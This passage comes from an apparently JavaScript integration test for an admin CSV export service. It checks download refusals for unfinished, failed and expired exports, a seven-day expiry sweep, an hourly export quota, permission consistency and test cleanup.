  res = await api(null, 'POST', `/admin/exports/${stillQueued.id}/download`, null, headers);
  check(
    'downloading one that is still building is 409 NOT_READY',
    res.status === 409 && res.body?.error?.code === 'NOT_READY',
    [res.status, res.body?.error?.code],
  );

  const failed = await seedExport(owner.id, {
    state: 'FAILED',
    error: 'That export would be more than 100,000 rows. Narrow the filters and try again.',
    completedAt: new Date(),
  });

  res = await api(null, 'POST', `/admin/exports/${failed.id}/download`, null, headers);
  check(
    'a failed one says why in the 409, rather than "not ready"',
    res.status === 409 && /100,000 rows/.test(res.body?.error?.message ?? ''),
    res.body?.error?.message,
  );

  const stale = await seedExport(owner.id, {
    state: 'READY',
    storageKey: 'admin-exports/does-not-exist.csv',
    rowCount: 1,
    completedAt: new Date(Date.now() - 8 * 86400000),
    expiresAt: new Date(Date.now() - 86400000),
  });

  res = await api(null, 'POST', `/admin/exports/${stale.id}/download`, null, headers);
  check(
    'a READY row past its seven days is 409, not a signed link to a deleted object',
    res.status === 409 && /expired/i.test(res.body?.error?.message ?? ''),
    res.body?.error?.message,
  );

  console.log('\n── The seven-day sweep ─────────────────────────────────────');

  const abandoned = await seedExport(owner.id, {
    createdAt: new Date(Date.now() - 2 * 3600_000),
  });

  res = await api(null, 'POST', '/admin/jobs/exports.expire/run', {}, bossHeaders);
  check('the sweep runs on demand', res.status < 300, [res.status, res.body?.error?.message]);

  const swept = await prisma.adminExport.findUnique({ where: { id: stale.id } });

  check(
    'the expired row is EXPIRED and no longer points at a file',
    swept?.state === 'EXPIRED' && swept?.storageKey === null,
    [swept?.state, swept?.storageKey],
  );
  check(
    'and the row itself is kept, because who exported what has to stay answerable',
    !!swept,
    swept?.id,
  );

  const givenUp = await prisma.adminExport.findUnique({ where: { id: abandoned.id } });

  check(
    'a job nothing ever picked up is marked FAILED rather than polled for ever',
    givenUp?.state === 'FAILED' && !!givenUp?.error,
    [givenUp?.state, givenUp?.error],
  );

  const survivor = await prisma.adminExport.findUnique({ where: { id: queued.id } });

  check(
    'and a live export is untouched by the sweep',
    survivor?.state === 'READY',
    survivor?.state,
  );

  console.log('\n── Twenty an hour ──────────────────────────────────────────');

  const quotaRole = await register('quota', ['exports:csv', 'members:read']);
  const quotaAdmin = await makeAdmin('exp-quota', quotaRole);
  const quotaHeaders = adminHeaders(quotaAdmin);

  for (let index = 0; index < 20; index += 1) {
    await seedExport(quotaAdmin.id, { state: 'READY', rowCount: 0, completedAt: new Date() });
  }

  res = await api(
    null,
    'POST',
    '/admin/exports',
    { kind: 'MEMBERS', columns: ['id'] },
    quotaHeaders,
  );
  check(
    'the twenty-first export in an hour is 429 EXPORT_LIMIT',
    res.status === 429 && res.body?.error?.code === 'EXPORT_LIMIT',
    [res.status, res.body?.error?.code],
  );
  check(
    'and says what the limit is, so the portal can say when to come back',
    res.body?.error?.data?.limit === 20 || /20/.test(res.body?.error?.message ?? ''),
    res.body?.error,
  );

  // An hour earlier does not count against the hour.
  await prisma.adminExport.updateMany({
    where: { requestedById: quotaAdmin.id },
    data: { createdAt: new Date(Date.now() - 2 * 3600_000) },
  });

  res = await api(
    null,
    'POST',
    '/admin/exports',
    { kind: 'MEMBERS', columns: ['id'] },
    quotaHeaders,
  );
  check('and the hour is a window, not a wall', res.status === 202, res.status);
  created.push(res.body?.data?.id);

  console.log('\n── The permissions the kinds name are real ─────────────────');

  const source = fs.readFileSync(
    path.join(__dirname, '../../src/modules/admin/exports/export-kinds.ts'),
    'utf8',
  );
  const declared = [...source.matchAll(/listPermissions: \[([^\]]*)\]/g)]
    .flatMap(match => match[1].match(/'[^']+'/g) ?? [])
    .map(quoted => quoted.replace(/'/g, ''));
  const known = await prisma.permission.findMany({
    where: { code: { in: declared } },
    select: { code: true },
  });

  check(
    'every export kind names a permission that exists',
    declared.length > 6 && known.length === new Set(declared).size,
    declared.filter(code => !known.some(row => row.code === code)),
  );

  // Clean up: the files these made are real objects in the bucket, and `admin_exports` has no
  // foreign key to the staff member who asked (by design — the receipt outlives the account), so
  // sweeping the users would leave both behind.
  await prisma.adminExport.updateMany({
    where: { id: { in: created.filter(Boolean) } },
    data: { expiresAt: new Date(Date.now() - 1000), state: 'READY' },
  });
  await api(null, 'POST', '/admin/jobs/exports.expire/run', {}, bossHeaders);
  await prisma.adminExport.deleteMany({ where: { id: { in: created.filter(Boolean) } } });
  await prisma.role.deleteMany({ where: { code: { in: roles } } });

  await sweep('admin-exports');
  await finish();
})().catch(async error => {
  await fail(error);
});
